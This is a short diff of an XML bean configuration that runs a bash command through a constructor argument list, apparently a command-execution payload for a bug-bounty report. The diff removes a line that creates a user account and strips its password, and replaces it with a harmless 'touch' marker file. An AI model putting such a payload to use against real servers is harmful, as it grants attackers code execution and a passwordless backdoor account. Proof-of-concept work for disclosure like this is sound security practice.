@@ -8,7 +8,7 @@
             <list>
                 <value>bash</value>
                 <value>-c</value>
-                <value>sudo adduser Indonesia;sudo passwd Indonesia -d</value>
+                <value>touch /tmp/nanwn-hackerone</value>
             </list>
             </constructor-arg>
         </bean>
